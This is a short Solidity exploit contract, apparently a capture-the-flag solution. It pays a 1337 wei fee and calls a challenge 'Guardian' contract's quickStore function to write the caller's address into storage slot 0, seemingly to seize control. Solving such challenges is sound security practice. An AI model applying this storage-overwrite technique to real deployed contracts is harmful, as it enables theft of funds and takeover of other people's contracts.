// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Setup.sol";

contract Attacker {
    Setup public immutable SETUP;

    constructor(address setup) payable {
        SETUP = Setup(setup);
    }

    function attack() public payable {
        // Ensure enough ETH is sent to cover the required fee (1337 wei)
        require(msg.value == 1337, "Incorrect eth value sent");

        // Encode the function call to quickStore
        bytes memory data = abi.encodeWithSignature("quickStore(uint8,uint256)", 0, address(msg.sender));

        // Call the Guardian contract with the encoded data
        (bool success, ) = address(SETUP.TARGET()).call{value: msg.value}(data);
        require(success, "Call to Guardian failed");

        //SETUP.TARGET().putToSleep();
    }
}
